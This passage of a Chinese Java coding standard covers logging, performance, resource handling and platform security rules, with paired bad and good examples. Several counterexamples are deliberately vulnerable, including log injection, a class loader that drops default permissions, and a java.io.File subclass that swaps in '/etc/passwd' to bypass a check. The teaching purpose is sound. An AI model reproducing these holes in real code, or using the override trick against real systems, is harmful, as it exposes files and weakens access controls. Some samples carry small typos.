    BaseClass obj = (BaseClass) objClass.newInstance();
    obj.doSomething();
} else {
    throw new IllegalStateException("Invalid reflect class!");
}
...
```

上述示例中，外部只能指定要反射的类的代号，当代号可映射为一个指定的类名时，执行反射操作，否则判断为非法参数。这样可以有效限制反射操作的类的范围。

### 3.13 日志

> G.LOG.01 记录日志应该使用Facade模式的日志框架

【级别】 要求

【描述】

专用日志工具与控制台打印（`System.out`、`System.err`）相比，提供了更丰富的日志记录功能，且使用更加简单。日志打印推荐使用Facade模式的日志框架，如第三方slf4j、产品自研日志框架等，不要使用`System.out`与`System.err`进行控制台打印。

【反例】（控制台打印日志）

```java
start = System.currentTimeMillis();
// 其他加载数据的代码
System.out.println ("items loaded, use " + (System.currentTimeMillis() - start) + "ms.");
```

【正例】 采用日志工具输出日志，例如slf4j+logback。

```java
start = System.currentTimeMillis();
// 其他加载数据的代码
LOGGER.info("items loaded, use {}ms.", (System.currentTimeMillis() - start));
```

> G.LOG.02 日志工具`Logger`类的实例必须声明为`private static final`或者`private final`

【级别】 要求

【描述】

对于工具类的实例，如果声明时并进行了初始化，应该声明为`private static final`，如果只是声明但未初始化，则应声明为`private final`。

- 声明为`private`是出于访问封装的考虑，防止`Logger`类的实例对象被其他类非法使用；
- 声明为`static`是为了防止重复`new`出`Logger`类的实例，造成资源的浪费，同时防止实例被序列化， 造成安全风险（精心设计的library除外）；
- 声明为`final`是因为在类的生命周期内无需变更`Logger`类的实例。

【正例】

```java
private static final Logger LOGGER = LoggerFacotry.getLogger(com.hw.product.MyClass.class);
```

【例外】

1. 枚举单例中，由于枚举类的静态成员变量的初始化在构造方法之后执行，当构造方法中涉及日志操作时，`Logger`类实例应该声明为`private final`。
2. 接口中需要记录日志时，`Logger`工具类的实例只能声明为`public static final`。

> G.LOG.03 日志必须分等级

【级别】 要求

【描述】

如果日志不分等级，则定位问题时，无法快速有效屏蔽大量低级别信息，给快速定位带来难度。

日志可分为以下级别：trace（有的也叫verbose）、debug、info、warning、error、fatal。

推荐与具体实现有关的日志记录trace或debug级，一般的业务处理日志用info级，不影响业务进行的错 误用warning级，例如用户输入参数错误。而error或fatal级，只记录系统逻辑出错、异常或者重要的错 误信息，常常向运维系统报警。

建议生产环境不输出trace或debug日志；有选择地输出info日志；输出warning、error、fatal日志。

**对info及以下级别的日志，应使用条件形式或占位符的方式进行输出。**

【反例】

如果日志级别设置为warning，下面日志不会打印，但是会执行字符串拼接操作，如果symbol是对象， 会执行 `toString()` 方法，这样执行了上述操作，浪费系统资源，最终日志却没有打印。

```java
LOGGER.debug("Processing trade with id: " + id + " and symbol: " + symbol);
```

【正例】

```java
// 如果日志库提供了带"msgSupplier"的API，如下这样调用可以消除不必要的消息创建
LOGGER.debug(() ->
             "Processing trade with id: " + id + " and symbol: " + symbol.fetchBigMessage());

// 采用条件方式
if (LOGGER.isDebugEnabled()) {
    LOGGER.debug("Processing trade with id: " + id + " and symbol: " + symbol);
}

// 或者使用占位符
LOGGER.debug("Processing trade with id: {} and symbol: {}" , id, symbol);
```

> G.LOG.04 非仅限于中文区销售产品禁止用中文打印日志

【级别】 要求

> G.LOG.05 禁止直接使用外部数据记录日志

【级别】 要求

【描述】

直接将外部数据记录到日志中，可能存在以下风险：

- 日志注入：恶意用户可利用回车、换行等字符注入一条完整的日志；
- 敏感信息泄露：当用户输入敏感信息时，直接记录到日志中可能会导致敏感信息泄露；
- 垃圾日志或日志覆盖：当用户输入的是很长的字符串，直接记录到日志中可能会导致产生大量垃圾日志；当日志被循环覆盖时，这样还可能会导致有效日志被恶意覆盖。

所以外部数据应尽量避免直接记录到日志中，如果必须要记录到日志中，要进行必要的校验及过滤处理，对于较长字符串可以截断。对于记录到日志中的数据含有敏感信息时，对于秘钥、口令类的敏感信 息，参考[G.LOG.06 禁止在日志中记录口令、密钥等敏感信息]将这些敏感信息替换为固定长度的*，对 于其他类的敏感信息（如手机号、邮箱等），可参考附录D先进行匿名化处理。

**关于日志注入问题，风险主要存在于操作日志中，利用日志注入攻击伪造正常日志，会影响对系统的安全审计；对于普通的运行日志，注入伪造日志一般不会影响问题定位分析。**

【反例】

```java
String jsonData = getRequestBodyData(request);
if (!validateRequestData(jsonData)) {
	LOG.error("Request data validate fail! Request Data : " + jsonData);
}
```

上述示例中，当请求的json数据校验失败，会直接将json字符串记录到日志中，当json字符串中含有敏感信息，会导致敏感信息泄露的风险，当恶意用户向json字符串中通过回车换行符注入伪造的日志会造成日志注入问题，当json字符串比较长时，会导致日志冗余。

【正例】

```java
public String replaceCRLF(String message) {
    if (message == null) {
    	return "";
    }
    return message.replace('\n', '_').replace('\r', '_');
}
```

外部数据写入日志前，先将其中的 \r\n 等导致换行的字符进行替换，消除日志注入风险。

> G.LOG.06 禁止在日志中记录口令、密钥等敏感信息

【级别】 要求

【描述】

在日志中不能记录口令、密钥等敏感信息，包括这些敏感信息的加密密文，防止产生敏感信息泄露风险。若因为特殊原因必须要记录日志，应用固定长度的星号（*）代替这些敏感信息。

【反例】

```java
private static final Logger LOGGER = Logger.getLogger(TestCase1.class);
...
LOGGER.info("Login success, user is " + userName + ", password is " +
            encrypt(pwd.getBytes(StandardCharsets.UTF_8)));
```

【正例】

```java
private static final Logger LOGGER = Logger.getLogger(TestCase1.class);
...
LOGGER.info("Login success, user is " + userName + ", password is ********.");
```

### 3.14 性能和资源管理

#### 3.14.1 性能

JVM的版本、实现不同，对性能影响很大。当基于较大的数据集基准测试确实有性能瓶颈时，考虑以下规则、建议来优化。

> G.PRM.01 将集合转为数组时使用 `Collection.toArray(T[])` 方法； 
> Java 11后使用 `Collection.toArray(IntFunction)`

【级别】 要求

【描述】

Java 11引入了 `Collection.toArray(IntFunction generator)` ，它更好的原因是不需要创建临时数组，一方面节省空间，另一方面这样就不用去考虑 `toArray(T[])` 里的参数长度对方法行为以及结果的影响。

【正例】（Java 11+）

```java
List<String> xs = ...;
String[] sa = xs.toArray(String[]::new);
```

另外，java.util.stream中各Stream的 `toArray()` 、`toArray(IntFunction<A[]>)` 也是常用的。

Java 11前 `toArray(T[] a)` 的参数应采用**零长度的数组**，这样可保证有更好的性能。数组容量大小产生的影响如下：

- 等于0，动态创建与size相同的数组，性能最好；
- 大于0但小于size，重新创建大小等于size的数组，增加GC负担；
- 等于size，在高并发情况下，数组创建完成之后，size正在变大的情况下，负面影响与上相同；
- 大于size，空间浪费，且在size处插入null值，存在NullPointerException隐患。

【正例】

```java
List<String> list = new ArrayList<>(DEFAULT_CAPACITY);
list.add(getElm());
String[] array = list.toArray(new String[0]);
```

> G.PRM.02 使用 `System.arraycopy()` 或 `Arrays.copyOf()` 进行数组复制

【级别】 建议

【描述】

在将一个数组对象复制成另外一个数组对象时，不要自己使用循环复制，可以使用Java提供的 `System.arraycopy()` 功能来复制数据对象，这样做可以避免出错，而且效率会更高。 `java.util.Arrays.copyOf()` 是对 `System.arraycopy()` 便利化封装。数组复制有如下特性：

- 对于一维数组，且数组元素为基本类型或String类型时，数组复制属于深复制，即复制后的数组与 原始数组的元素互不影响；
- 对于多维数组，或一维数组中的元素是引用类型时，数组复制属于浅复制，即复制后的数组与原始数组的元素引用指向的是同一个对象。

【反例】

```java
int[] src = {1, 2, 3, 4, 5};
int[] dest = new int[5];
for (int i = 0; i < 5; i++) {
	dest[i] = src[i];
}
```

【正例】

```java
int[] src = {1, 2, 3, 4, 5};
int[] dest = new int[5];
System.arraycopy(src, 0, dest, 0, 5);
```

【正例】（二维数组复制）

```java
int[][] src = {{1, 2}, {3, 4}};
int[][] dest = new int[2][2];

System.arraycopy(src, 0, dest, 0, 2);
dest[0][1] = 5;
System.out.println(src[0][1]); // 打印5

int[][] newDest = new int[2][2];
for (int i = 0; i < src.length; i++) {
	System.arraycopy(src[i], 0, newDest[i], 0, 2);
}

newDest[0][0] = 6;
System.out.println(src[0][0]); // 打印1
```

> G.PRM.03 初始化集合时，如果可预估元素数量，应该指定初始化大小

【级别】 建议

【描述】

集合有扩容机制，每次向集合中添加元素时，都会检测当前元素数量是否达到触发扩容的阈值，达到阈值则会重新生成一段更大的内存段（例如HashMap扩容2倍，ArrayList扩容1.5倍），然后将原来内存 里的数据拷贝到新的内存段中。这个过程比较耗费资源，有性能损耗，尤其是集合需要添加大量元素时 导致集合进行多次扩容。

在集合初始化时指定其初始化容量，可以有效避免向集合中添加元素时触发其扩容机制。如果无法预估 集合的容量或者集合中仅存放少量元素时，可以直接使用其默认值DEFAULT_INITIAL_CAPACITY，例如 ArrayList（默认10）、HashMap（默认16）、HashSet（默认16）、XxxBlockingQueue（array的要 手工指定，linked默认Integer.MAX_VALUE）等等。

对于HashMap这类具有负载因子（DEFAULT_LOAD_FACTOR = 0.75）的集合，在设置初始化容量时考 虑负载因子的影响，这样才能正确避免扩容。初始化容量 = （元素数/负载因子）+1。

该条款同样适用于StringBuilder等。

【反例】 在已知集合需要添加元素的数量时，并没有设置正确的集合初始化大小。

```java
public static List<String> decorate(String[] personDescs) {
    List<String> personNames = new ArrayList<>();
    for (String personDesc : personDescs) {
        String personName = getPersonName(personDesc);
        ... // 其他操作
        personNames.add(personName);
    }
    return personNames;
}
```

【正例】 在已知集合需要添加元素的数量时，以实际元素数量作为集合的初始化容量值。

```java
public static List<String> decorate(String[] personDesc) {
    List<String> personNames = new ArrayList<>(personDesc.length);
    for (String personDesc : personDescs) {
        String personName = getPersonName(personDesc);
        ... // 其他操作
        personNames.add(personName);
    }
    return personNames;
}
```

【反例】

```java
public void doSomething() {
    List<PersonInfo> personList = getPersonInfoList();
    Map<String, PersonInfo> personMap = new HashMap<>(persons.size()); // 未考虑负载因子的影响
    for (PersonInfo person : personList) {
        String data = getSomeInfo(person);
        personMap.put(data, person);
    }
}
```

上述示例中，在初始化Map时，直接使用实际PersonInfo的数量作为集合的初始化大小，由于未考虑负载因子的影响，后续的操作中仍可能会出现自动扩容。

【正例】

```java
public void doSomething() {
    List<PersonInfo> personList = getPersonInfoList();
    Map<String, PersonInfo> personMap = new HashMap<>(persons.size(), 1.0F);
    for (PersonInfo person : personList) {
        String data = getSomeInfo(person);
        personMap.put(data, person);
    }
}
```

上述示例中，在设置Map的初始化容量时，将负载因子设置为1，这样在后续向集合中添加元素操作时，可以有效避免出现自动扩容。

> G.PRM.04 不要对正则表达式进行频繁重复预编译

【级别】 要求

【描述】

在频繁调用的场景（例如在方法体内或循环语句中）中，定义Pattern会导致重复预编译正则表达式， 降低程序执行效率。另外，对于JDK中的某些API会接受字符串格式的正则表达式作为参数，如 `String.replaceAll`、`String.split` 等，对于这些API的使用也要考虑性能问题。

【反例】

```java
public class RegexExp {
    // 该方法被频繁调用
    private boolean isLowerCase(String str) {
        Pattern pattern = Pattern.compile("[a-z]+");
        if (pattern.matcher(str).find()) {
            return true;
        }
        return false;
    }
}
```

上述示例中，`isLowerCase()` 被调用时，会对正则进行编译。该方法被频繁调用时，都导致大量重复 的正则编译操作。

【正例】

```java
public class RegexExp {
    private static final Pattern CHARSET_REG = Pattern.compile("[a-z]+");
    // 该方法被频繁调用
    private boolean isLowerCase(String str) {
        if (CHARSET_REG.matcher(str).find()) {
            return true;
        }
        return false;
    }
}
```

上述示例中，`isLowerCase()` 使用的是被编译过的正则，即使是被频繁调用，也不会有正则的重复编译。

【反例】

```java
public class RegexExp {
    private void doSomething(String[] args) {
        int count = 0;
        for (String str : args) {
            Pattern pattern = Pattern.compile("[a-z]+");
            if (pattern.matcher(str).find()) {
                count++;
            }
        }
        ...
    }
}
```

上述示例中，每次for循环都会对正则进行编译。

【正例】

```java
public class RegexExp {
    private static final Pattern CHARSET_REG = Pattern.compile("[a-z]+");
    
    private void doSomething(String[] args) {
        int count = 0;
        for (String str : args) {
            if (CHARSET_REG.matcher(str).find()) {
                count++;
            }
        }
        ...
    }
}
```

上述示例中，for循环中调用编译过的正则，有效避免了正则的重复编译。

【反例】

```java
...
for(String temp : strList) {
    temp.replaceAll(regex, "XXX");
    ...
}
...
```

上述示例中，当对于大量字符串中的某些固定内容进行替换时，会导致每次执行 replaceAll 操作时都会对正则进行编译。

【正例】

```java
...
Pattern pattern = Pattern.compile(regex);
for(String temp : strList) {
    pattern.matcher(temp).replaceAll("XXX");
    ...
}
...
```

上述示例中，对大量字符串进行替换操作时，首先对替换规则的正则进行编译，避免了每次替换操作时重复对正则进行编译。

【例外】

如果正则表达式由方法中的变量组成，可以在方法体内定义。

#### 3.14.2 资源管理

对于短生存周期、不常用的对象不要使用直接缓冲区。

从长生存周期容器对象中移除短生存周期对象：对于静态容器（如HashMap、ArrayList等），其生命 周期与程序一致，容器中保存的对象在程序结束之前不能被释放，这样容易导致内存泄露问题。因此， 应尽量避免使用静态集合；如果必须使用静态集合，要对于不再使用的对象及时从集合中移除。

当要通过实现 AutoCloseable、Closeable 接口自定义资源类时，建议实现的 close() 方法是幂等的，即多次调用该方法与一次调用的效果是相同的，重复调用该方法不会产生副作用（如抛出异常）。

尽量在同一代码抽象层实现资源管理，例如对于在一个方法内部中创建的IO流资源，如果方法在退出后该资源不再被使用，应该在方法中直接释放该资源；如果一个IO流资源是某Class的成员变量，建议该 Class中提供一个释放IO流资源的方法。

> G.PRM.05 禁止创建不必要的对象

【级别】 要求

【描述】

重用一个已经创建的对象比创建一个新的对象要好得多，除非确实需要重新创建。创建重复不必要的对象会导致资源浪费，严重时可能会导致性能问题。

【反例】

```java
String foo = new String("string"); // 建立了2个String对象
Integer bar = new Integer(90);
...
Integer baz = new Integer(90);
```

【正例】

```java
String foo = "string";
Integer bar = Integer.valueOf(90);
...
Integer baz = Integer.valueOf(90); // 默认在-128~127间，会重用内存中缓存的对象
```

> G.PRM.06 将对象存入`HashSet`，或作为key存入`HashMap`（或`HashTable`） 后，必须确保该对象的hashcode值不变

【级别】 要求

【描述】

对于Hash集合（HashMap，HashSet等）而言，对象的hashcode至关重要，在Hash集合内查找该对象完全依赖此值。如果一个对象存入Hash集合后hashcode随即发生变化，结果就是无法在集合内找到 该对象，进而不能删除该对象，最终导致内存泄漏。

【反例】

```java
public class Email {
    public String address;
    
    public Email(String address) {
        this.address = address;
    }
    
    public int hashCode() {
        return address.hashCode();
    }
    
    public static void main(String[] args) {
        HashSet<Email> set = new HashSet<>();
        Email email = new Email("hw.com");
        set.add(email);
        email.address = "silong.com"; // 修改地址值，导致hashcode值变化
        System.out.println(set.contains(email)); // 错误
        set.remove(email); // 泄漏
    }
}
```

> G.PRM.07 进行IO类操作时，必须在try-with-resource或finally里关闭资源

【级别】 要求

【描述】

申请的资源不再使用时，需要及时释放，否则会导致资源泄露问题。释放后的资源不要继续使用，否则可能导致系统抛出异常或其他未知不安全行为。

系统异常可能导致资源释放操作被跳过，因此对于IO、数据库操作等需要显式调用关闭方法（如 `close()` ）来释放资源的场景，必须在try-catch-finally的finally中调用关闭方法。如果有多个资源需 要 `close()` ，需要分别对每个资源 `close()` 时的异常进行try-catch处理，防止某个资源关闭失败导致 其他资源无法正常关闭，最终保证所有资源都能被正确释放。

Java 7有自动资源管理的特性try-with-resource，不需手动关闭。该方式应该优先于try-finally，这样得 到的代码将更加简洁、清晰，产生的异常也更有价值。特别是对于多个资源关闭发生异常时，tryfinally可能丢失掉前面的异常，而try-with-resource会保留第一个异常，并把后续的异常作为 Suppressed exceptions，可通过 `getSuppressed()` 获取这些异常信息。

try-finally也常用于锁的释放等场景，保证异常场景下锁也能正常释放。

【正例】

```java
try (FileInputStream in = new FileInputStream(inputFileName);
    FileOutputStream out = new FileOutputStream(outputFileName)) {
    copy(in, out);
}
```

> G.PRM.08 禁止使用主动GC（除非在密码、RMI等方面），尤其是在频繁/周期性 的逻辑中

【级别】 要求

【描述】

虽然主动调用GC方法时JVM规范不承诺立即进行垃圾回收操作，但是Oracle Java SE JVM在绝大多数情况下响应此方法调用，会触发JVM的全量GC操作，这会增加GC的次数，也就增加了程序因为GC而停顿 的时间；而且在GC过程中的某些阶段程序会完全停顿，这会让程序失去响应，对系统造成非常大的风险。在频率/周期性的逻辑（for循环、定时器）中更要尽量避免主动GC的调用。

【反例】

在循环中调用了 `System.gc()` ，会引起JVM频繁、连续地全量GC，从而造成业务逻辑线程阻塞，不响应或者很慢地响应业务请求。

```java
for (String bookName : bookNames) {
    Book book = new Book(bookName);
    checkBook(book);
    ... // 其他操作
    System.gc();
}
```

【正例】

不使用主动GC，或者在循环之外的关键节点上调用主动GC。

```java
for (String bookName : bookNames) {
    Book book = new Book(bookName);
    checkBook(book);
    ... // 其他操作
}
System.gc();
```

> G.PRM.09 禁止使用`finalize()`方法

【级别】 要求

【描述】

`finalize()` 方法的调用时机是不可预测的，常常也是危险的。使用 `finalize()` 方法可能会导致不稳定的行为，更差的性能，以及带来移植性问题。

【例外】

允许泄漏检测等调测意图的 `finalize()` 实现，例如在安卓中。

> G.PRM.10 不要创建临时变量作为return语句的返回值

【级别】 建议

【描述】 不要创建临时变量作为return语句的返回值，保持代码简洁。

【反例】

```java
private List<String> func() {
    List<String> res = solve();
    return res;
}
```

【正例】

```java
private List<String> func() {
	return solve();
}
```

### 3.15 平台安全

> P.06 对外部对象进行安全检查时需要进行防御性拷贝

【描述】

如果一个可信类未被声明为 `final` ，并且该类中存在非 `final` 的涉及安全检查的方法，则会存在一定的安全隐患。攻击者可以通过继承该类并覆写其中非 `final`方法，来达到绕过安全检查的目的。因此， 在对不可信的对象进行安全检查时，需要对其进行防御性拷贝，并且拷贝必须是深拷贝，然后对拷贝的 对象进行安全检查，这样就能保证不会调用到攻击者覆写的方法。

【反例】

```java
public FileInputStream getFileAsStream(java.io.File file) {
    try {
        this.securityCheck(file.getPath());
        return new FileInputStream(file);
    } catch (IOException ex) {
        // 处理异常
    }
    ...
}

// 在FileInputStream的构造方法中也需要调用file.getPath()获取文件路径
public FileInputStream(File file) throws FileNotFoundException {
    String name = (file != null ? file.getPath() : null);
    ...
        open(name);
    ...
}
```

上述示例中，由于 `java.io.File` 不是 `final` 的，并且 `getPath()` 方法也不是 `final` 的，因此攻击者 可以继承该类并覆写 `getPath()` 方法来绕过安全检查。如下代码所示， `getPath()` 方法第一次调用时 会返回正常的文件路径，而之后的每次调用都会返回敏感文件路径。这样攻击者拿到的其实 是 `/etc/passwd` 对应的 `FileInputStream` 。这是 `time-of-check,time-of-use(TOCTOU)` 漏洞的一个 典型例子。

**攻击者可将java.io.File按如下方式扩展：**

```java
public class UntrustedFile extends java.io.File {
    private int count;
    public UntrustedFile(String path) {
        super(path);
    }
    @Override
    public String getPath() {
        return (++count == 1) ? "/tmp/pub" : "/etc/passwd";
    }
}
```

【正例】

```java
public FileInputStream getFileAsStream(java.io.File file) {
    java.io.File copy = new java.io.File(file.getPath());
    try {
        this.securityCheck(copy.getPath());
        return new FileInputStream(copy);
    } catch (IOException ex) {
        // 处理异常
    }
    ...
}
```

上述示例中，通过 `java.io.File` 的构造方法创建了一个新的文件对象，这样可以保证在 `copy` 对象上 调用的任何方法均来自标准类库。

> G.SEC.01 进行安全检查的方法必须声明为`private`或`final`

【级别】 要求

【描述】

实现安全检查功能（主要是指调用SecurityManager执行的安全检查）的方法，如果可以被子类覆写， 恶意子类可以覆写安全检查方法，忽略这些安全检查，使安全检查失效。所以安全检查相关的方法必须 声明为private或final，防止被子类覆写。

【反例】

```java
public PasswordAuthentication requestPasswordAuthentication(InetAddress addr, 
                                                            String protocol, String prompt, String scheme) {
    SecurityManager sm = System.getSecurityManager();
    if (sm != null) {
        NetPermission requestPermission = new NetPermission(
            "requestPasswordAuthentication");
        sm.checkPermission(requestPermission);
    }
    
    CIMAuthenticator auth = theAuthenticator;
    auth.reset();
    auth.requestingSite = addr;
    auth.requestingProtocol = protocol;
    auth.requestingPrompt = prompt;
    auth.requestingScheme = scheme;
    return auth.getPasswordAuthentication();
}
```

上述示例中， `requestPasswordAuthentication()` 方法可以被覆写，忽略其中的安全检查。

【正例】

```java
public final PasswordAuthentication requestPasswordAuthentication(InetAddress addr, 
                                                                  String protocol, String prompt, String scheme) {
    SecurityManager sm = System.getSecurityManager();
    if (sm != null) {
        NetPermission requestPermission = new NetPermission(
            "requestPasswordAuthentication");
        sm.checkPermission(requestPermission);
    }

    CIMAuthenticator auth = theAuthenticator;
    auth.reset();
    auth.requestingSite = addr;
    auth.requestingProtocol = protocol;
    auth.requestingPrompt = prompt;
    auth.requestingScheme = scheme;
    return auth.getPasswordAuthentication();
}
```

上述示例中，方法声明为final方法，防止被子类覆写。

【正例】

```java
private PasswordAuthentication requestPasswordAuthentication(InetAddress addr,
                                                             String protocol, String prompt, String scheme) {
    SecurityManager sm = System.getSecurityManager();
    if (sm != null) {
        NetPermission requestPermission = new NetPermission(
            "requestPasswordAuthentication");
        sm.checkPermission(requestPermission);
    }
    
    CIMAuthenticator auth = theAuthenticator;
    auth.reset();
    auth.requestingSite = addr;
    auth.requestingProtocol = protocol;
    auth.requestingPrompt = prompt;
    auth.requestingScheme = scheme;
    return auth.getPasswordAuthentication();
}
```

上述示例中，方法声明为private方法，防止被子类覆写。

【例外】

对于final类不受该规则的限制，因为它们的成员方法是不能被覆写的。

> G.SEC.02 自定义类加载器覆写 `getPermission()` 时，必须先调用父类的 `getPermission()` 方法

【级别】 要求

【描述】

自定义类加载器，如果需要覆写 `getPermissions()` 方法时，在给其他代码设置权限之前，必须要先调用父类的 `getPermissions()` 方法来应用默认的安全策略。自定义类加载器如果忽略调用父类的 `getPermissions()` 方法，该类加载器可以加载提升权限的不可信类。

【反例】

```java
public class MyClassLoader extends URLClassLoader {
    public MyClassLoader(URL[] urls) {
        super(urls);
    }
    
    @Override
    protected PermissionCollection getPermissions(CodeSource cs) {
        PermissionCollection pc = new Permissions();
        // 允许任何时间退出VM
        pc.add(new RuntimePermission("exitVM"));
        return pc;
    }
    
    ... // 其他代码
}
```

上述示例中，MyClassLoader继承自URLClassLoader类，它覆写了 `getPermissions()` 方法，但没有 调用父类的 `getPermissions()` 方法。因此，被该加载器加载的类具有的权限会独立于系统全局安全策略规定的权限。

【正例】

```java
public class MyClassLoader extends URLClassLoader {
    public MyClassLoader(URL[] urls) {
        super(urls);
    }
    
    @Override
    protected PermissionCollection getPermissions(CodeSource cs) {
        PermissionCollection pc = super.getPermissions(cs);
        // 允许任何时间退出VM
        pc.add(new RuntimePermission("exitVM"));
        return pc;
    }
    
    ... // 其他代码
}
```

上述示例中， getPermissions() 方法调用父类的 getPermissions() 来使用全局的默认安全策略。

> G.SEC.03 加载外部JAR文件时，不要依赖URLClassLoader和java.util.jar提供的 默认自动签名检查机制

【级别】 要求

【描述】

当一些第三方代码需要提升权限执行某些操作时，供应方一般会对JAR文件进行签名以保证代码来源的可靠性以及合法性。在Java中， `URLClassLoader` 和 `java.util.jar` 提供了默认的自动签名检查机制，该机制通过JAR文件中包含的证书来对加载的类进行检查，却没有检查证书本身的合法性。如果在 加载时，合法的JAR文件被恶意JAR文件替换，并且恶意的JAR文件中也包含一个证书和被适当修改过的 摘要值，那么默认的自动签名检查机制可能会被绕过，系统存在被恶意攻击的风险。

因此，仅仅依靠默认的签名检查机制不足以保证JAR文件的合法性，使用者需要提供额外的程序化检查机制，例如，通过一个已知的受信任的签名者来校验JAR文件中的签名信息。

【反例】

```java
public final void invokeMain(URL url, String[] args) throws IOException, NoSuchMethodException, 			                                                                     InvocationTargetException, ClassNotFoundException {
    UnSafeClassLoader unSafeClassLoader = new UnSafeClassLoader(url);
    unSafeClassLoader.invokeClass(unSafeClassLoader.getMainClassName(), args);
}
public class UnSafeClassLoader extends URLClassLoader {
    private static final String JAR_PROTOCOL = "jar";
    private static final String MAIN_METHOD_NAME = "main";
    
    private final URL url;
    
    public UnSafeClassLoader(URL url) {
        super(new URL[] {url});
        this.url = url;
    }
    
    public String getMainClassName() throws IOException {
        URL url = new URL(JAR_PROTOCOL, "", url + "!/");
        JarURLConnection uc = (JarURLConnection) url.openConnection();
        Attributes attr = uc.getMainAttributes();
        return attr != null ? attr.getValue(Attributes.Name.MAIN_CLASS) : null;
    }
    
    public void invokeClass(String name, String[] args) throws ClassNotFoundException,
    NoSuchMethodException, InvocationTargetException {
        Class<?> cl = loadClass(name);
        Method method = cl.getMethod(MAIN_METHOD_NAME, args.getClass());
        if (this.isMainMethod(method)) {
            try {
                method.setAccessible(true);
                method.invoke(null, new Object[] {args});
            } catch (IllegalAccessException ex) {
                ...
            }
        } else {
            throw new NoSuchMethodException(MAIN_METHOD_NAME);
        }
    }
    
    private boolean isMainMethod(Method method) {
        int mods = method.getModifiers();
        return method.getReturnType() ==
            void.class && Modifier.isStatic(mods) && Modifier.isPublic(mods);
    }
}
```

上述示例中，在 `invokeMain()` 方法中创建了一个 `UnSafeClassLoader` 实例，该实例通过 `URL` 加载JAR 文件，并通过反射调用JAR文件中的 `main()` 方法。默认情况下， `UnSafeClassLoader` 通过JAR文件中 的证书来校验签名，而没有对证书本身进行验证，因此加载的JAR文件可能是被恶意替换的JAR文件。

【正例】

```java
public final void invokeMain(URL url, String[] args) throws IOException, NoSuchMethodException,                                                                                   InvocationTargetException, ClassNotFoundException {
    SafeClassLoader safeClassLoader = new SafeClassLoader(url);
    safeClassLoader.invokeClass(safeClassLoader.getMainClassName(), args);
}
public class SafeClassLoader extends URLClassLoader {
    private static final String JAR_PROTOCOL = "jar";
    private static final String MAIN_METHOD_NAME = "main";
    
    private final URL url;
    
    public SafeClassLoader(URL url) {
        super(new URL[] {url});
        this.url = url;
    }
    
    public String getMainClassName() throws IOException {
        URL jarUrl = new URL(JAR_PROTOCOL, "", url + "!/");
        JarURLConnection uc = (JarURLConnection) jarUrl.openConnection();
        Attributes attr = uc.getMainAttributes();
        return attr != null ? attr.getValue(Attributes.Name.MAIN_CLASS) : null;
    }
    
    public void invokeClass(String name, String[] args) throws ClassNotFoundException,
    NoSuchMethodException, InvocationTargetException {
        if (!secureCheck(name)) {
            return;
        }
        Class<?> cl = loadClass(name);
        Method method = cl.getMethod(MAIN_METHOD_NAME, args.getClass());
        if (this.isMainMethod(method)) {
            try {
                method.setAccessible(true);
                method.invoke(null, new Object[] {args});
            } catch (IllegalAccessException ex) {
                ...
            }
        } else {
            throw new NoSuchMethodException(MAIN_METHOD_NAME);
        }
    }
    
    private boolean secureCheck(String name) throws ClassNotFoundException {
        if (!name.startsWith("com.huawei")) {
            return false;
        }
        Class<?> cl = loadClass(name);
        Certificate[] certs = cl.getProtectionDomain().getCodeSource().getCertificates();
        if (certs == null) {
            return false;
        }
        try {
            KeyStore ks = KeyStore.getInstance("JKS");
            ks.load(this.getKeyStoreFileStream(),
                    this.getKeyStorePassword().toCharArray());
            Certificate pubCert = ks.getCertificate("user");
            certs[0].verify(pubCert.getPublicKey());
            ... // 其他代码
        } catch (IOException | ... ex) {
            return false;
        }
        return true;
    }
    
    private boolean isMainMethod(Method method) {
        int mods = method.getModifiers();
        return method.getReturnType() ==
            void.class && Modifier.isStatic(mods) && Modifier.isPublic(mods);
    }
    
    private InputStream getKeyStoreFileStream() throws FileNotFoundException {
        return new FileInputStream(
            System.getProperty("user.home") + File.separator + "keystore.jks");
    }
    
    private String getKeyStorePassword() {
        String pwd;
        ...
            return pwd;
    }
}
```

上述示例中，在 `SafeClassLoader` 类中新增了 `secureCheck` 方法，方法中首先校验包路径是否以 `com.hw` 开头，之后从加载类的代码源（`Code-Source`）中获取到证书链，然后获取保存在本地密钥库（`KeyStore`）中的受信任签名者的公钥，通过该公钥对证书进行校验。 当本地系统采用不可靠的验证签名时，调用程序必须通过程序化的方式验证签名。具体做法是，程序必须从加载类的代码源（`Code-Source`）中获取证书链，然后检查证书是否属于某个事先获取并保存在本地密钥库（`KeyStore`）中的受信任签名者。

> G.SEC.04 使用安全管理器来保护敏感操作

【级别】 建议

【描述】

所有的敏感操作必须经过安全管理器的检查，防止被不可信的代码调用。 对于 Java API 中的敏感操作，例如文件操作、向远程主机开放套接字连接以及创建 ClassLoader 等， 在源码中已经添加了安全检查的代码逻辑，开发者只需要安装安全管理器即可；对于应用本身的敏感操 作，除了安装安全管理器之外，还需要自定义安全策略，并在合适的位置添加安全检查的代码。

【反例】

```java
public final class SensitiveMap {
    private final Map<Integer, String> resourceMap = new HashMap<>();
    public void removeEntry(Integer key) {
        resourceMap.remove(key);
    }
}
```

上述示例中， `resourceMap` 包含敏感信息，然而 `removeEntry()` 方法是 `public` 的并且没有被安全管 理器检查，因此恶意调用者可以通过该方法随意删除敏感信息。

【正例】

```java
public final class SecureSensitiveMap {
    private static final SensitiveResourcePermission REMOVE_ENTRY_PERMISSION =
        new SensitiveResourcePermission("removeEntry");
    
    private final Map<Integer, String> resourceMap = new HashMap<>();
    
    public void removeEntry(Integer key) {
        this.securityCheck();
        resourceMap.remove(key);
    }
    
    private void securityCheck() {
        SecurityManager securityManager = System.getSecurityManager();
        if (securityManager != null) {
            securityManager.checkPermission(REMOVE_ENTRY_PERMISSION);
        }
    }
}
```

配置如下：

```java
grant codeBase "file:${{trusted.code.dirs}}/*" {
	permission com.huawei.security.SensitiveResourcePermission "removeEntry";
};
```

推荐示例中，新增 `securityCheck()` 方法来保护 `resourceMap` ，防止不可信代码调用 `removeEntry()` 方法。 通过启动参数启动安全管理器（推荐方式）。

通过启动参数启动安全管理器（推荐方式）。

```java
-Djava.security.manager
```

通过代码的方式启动安全管理器。

```java
System.setSecurityManager(new SecurityManager());
```

### 3.16 其他

> G.OTH.01 安全场景下必须使用密码学意义上的安全随机数

【级别】 要求

【描述】

不安全的随机数可能被部分或全部预测到，导致系统存在安全隐患，安全场景下使用的随机数必须是密码学意义上的安全随机数。密码学意义上的安全随机数分为两类：

- 真随机数产生器产生的随机数；
- 以真随机数产生器产生的少量随机数作为种子的密码学安全的伪随机数产生器产生的大量随机数。

